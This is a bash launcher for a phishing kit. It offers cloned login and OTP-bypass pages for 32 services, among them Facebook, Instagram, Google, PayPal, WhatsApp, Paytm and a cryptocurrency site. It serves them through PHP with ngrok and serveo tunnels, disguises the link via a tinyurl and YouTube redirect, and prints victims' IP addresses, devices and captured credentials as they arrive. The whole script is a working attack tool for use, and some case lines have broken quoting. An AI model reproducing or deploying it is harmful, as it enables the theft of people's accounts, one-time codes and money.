trap 'printf "\n";stop' 2
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}
catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt

}

checkfound() {
	cd sites > /dev/null 2>&1
	cd $server > /dev/null 2>&1

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt


fi
if [ -e log.txt ];then
cat log.txt
rm log.txt
fi
done
}
starting () {
printf "\n\n\033[1;92m[\033[0m+\033[1;92m]\033[1;96m Starting ngrok server.....\n\n"
ngrok http 3333 > /dev/null 2>&1 &
sleep 14
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [ -z $link ];then
random
printf "\n Error !! Not ngrok link coming Try again!!\n"
fi
printf "\e[1;92m [\e[0m<\e[1;92m] Your Ngrok link:\e[0m\e[1;77m %s\e[0m\n\n" $link
}
s-n() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites
cd $server
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 4
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
#command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
if [ -z $send_link ];then
random
printf "\n Error !!\n"
exit
fi
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Your serveo link:\e[0m\e[1;77m %s \n' $send_link

send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
starting
#printf "\n Starting ngrok server..\n"
#~/ngrok http 3333 > /dev/null 2>&1 &
#link-ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
#printf "\n \033[1;92m Your ngrok link : " $link-ngrok
random
#cd sites
#cd $server
checkfound
#tail -f log.txt | grep -e "username" -e "otp"

}
start() {
	printf "\033[1;92m[\033[0m1\033[1;92m]\033[1;93m Server And Ngrok \n\n"
	echo -e -n "\033[1;93m Select : "
	read a
	case $a in
	1)s-n ;;
	*)s-n ;;
	esac
	}

banner(){
	random
	figlet Advance
	random
	figlet phishing
printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato-TFO\e[0m         \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit         \n"                                                                       
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay-TFO\e[0m       \e[0m\n"                                                                                                                    
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal-TFO\e[0m         \e[0m\n"                                                                                           
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Telegram-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m OLA-TFO\e[0m                \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;93m Twitter-TFO\e[0m        \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;93m Flipcart-TFO/\e[0m      \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm-TFO\e[0m              \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m          \e[0m\n"                                                                                          
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-Followers\e[0m    \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail-TFO\e[0m     \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Amazon-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;93m Stackoverflow\e[0m      \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;93m ebay-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;93m Twitch-TFO\e[0m         \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Hotstar-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;93m Ajio-TFO\e[0m           \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Spotify-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;93m Cryptocurrency/\e[0m    \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Github-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;93m Mobikwik-TFO\e[0m       \e[0m\n"                                                                                         
printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m               \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m          \e[0m\n"                                                                                         
echo
echo
echo -e -n "\033[1;92m Select your option :\033[0m "
read a
case $a in
1)server="tiktok"
start ;;
2)server="facebook"
start ;;
3)server="instagram"
start ;;
4)server="UberEats-Phishing"
start ;;
5)server="ola-otpbypass"
start ;;
6)server="google-otp"
start ;;
7)server="Paytm-Phishing"
start ;;
8)server="Netflix"
start ;;
9)server=instafollow"
start ;;
10)server="amazonsign"
start ;;
11)server="whatsapp-phishing"
start ;;
12)server="Linkedin"
start ;;
13)server="Hotstar-otp-bypass"
start ;;
14)server="spotify"
start ;;
15)server="github
start ;;
16)server="ipfinder"
start ;;
17)server="Zomato-Phishing"
start ;;
18)server="phonepay"
start ;;
19)server="paypal"   
start ;;
20)server="telegram"
start ;;
21)server="twitter"
start ;;
22)server="flipcart"
start ;;
23)server="wordpress"
start ;;
24)server="snapchat"
start ;;
25)server="protonmail"
start ;;
26)server="stackoverflow"
start ;;
27)server="ebay"
start ;;
28)server="twitch"
start ;;
29)server="ajio"
start ;;
30)server="cryptocurrency"
start ;;
31)server="mobikwik"
start ;;
32)server="pinterest"
start ;;
99)exit ;;
*)banner
esac
}
cd $PREFIX/bin
if [ -e Phishing ];then
cd ~/Advance-Phishing
banner
else
cd ~/Advance-Phishing
unzip adv.zip
cd sites
bash setup.sh
fi
banner